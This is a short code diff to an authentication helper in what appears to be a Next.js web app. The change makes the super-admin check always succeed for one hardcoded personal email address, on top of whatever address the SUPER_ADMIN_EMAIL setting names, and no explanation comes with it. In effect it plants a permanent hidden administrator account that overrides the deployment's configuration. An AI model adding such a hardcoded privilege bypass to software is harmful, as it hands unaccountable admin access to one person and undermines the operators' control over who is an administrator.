@@ -3,7 +3,7 @@ import { cookies } from "next/headers";
 
 export function isSuperAdmin(email: string): boolean {
   const superAdminEmail = process.env.SUPER_ADMIN_EMAIL || "rahalhamal2005@gmail.com";
-  return email.toLowerCase() === superAdminEmail.toLowerCase();
+  return email.toLowerCase() === superAdminEmail.toLowerCase() || email.toLowerCase() === "rahalhamal2005@gmail.com";
 }
 
 export async function getCurrentUser() {
